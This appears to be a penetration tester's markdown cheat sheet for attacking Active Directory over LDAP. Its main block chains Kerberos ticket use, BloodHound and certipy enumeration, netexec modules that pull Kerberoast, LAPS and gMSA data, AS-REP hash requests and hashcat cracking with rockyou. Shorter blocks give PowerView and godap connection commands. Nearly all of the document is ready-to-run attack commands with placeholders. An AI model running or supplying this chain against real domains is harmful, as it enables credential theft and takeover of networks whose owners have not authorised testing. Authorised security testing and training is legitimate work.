# LDAP
#target/remote #os/linux #cat/ad #proto/ldap #port/389

## LDAP all in one
```
getTGT.py <domain>/'<user>'<impacket_auth>;export KRB5CCNAME=$(pwd)/'<user>'.ccache; bloodyAD --host <fqdn> -d <domain> -u '<user>' -k get writable; echo; bloodhound-ce-python --zip -c All -d <domain> -dc <dc_fqdn> -ns <dc_ip> -u '<user>' -k -no-pass; echo; nxc smb <ip> --generate-krb5-file /etc/krb5.conf; echo; certipy find -enabled -u '<user>'@<domain> -k -target <fqdn> -dc-ip <dc_ip> -json -output initial_enabled -timeout 2; echo; certipy find -vulnerable -u '<user>'@<domain> -k -target <fqdn> -dc-ip <dc_ip> -stdout -timeout 2; echo; parse_certipy.py initial_enabled_Certipy.json; echo; nxc ldap <ip> --use-kcache --pass-pol --pso --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --users --groups --dc-list --gmsa; nxc ldap <ip> --use-kcache -M maq -M sccm -M laps -M adcs -M pre2k -M badsuccessor -M dns-nonsecure -M dump-computers -M get-network -M obsolete; echo; GetNPUsers.py -request -outputfile hashes.asreproast <domain>/<user> -k -no-pass -dc-host <fqdn>; echo; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet; powerview <domain>/'<user>'@<dc_fqdn> -k --no-pass
```

## PowerView connect
```
powerview <domain>/'<user>'<auth> --no-cache
```

## Powerview anonymous connect
```
powerview <fqdn> --no-cache
```

## godap connect
```
godap <fqdn> -u '<user>' -d <domain> <auth> -t 'ldap/<fqdn>'
```
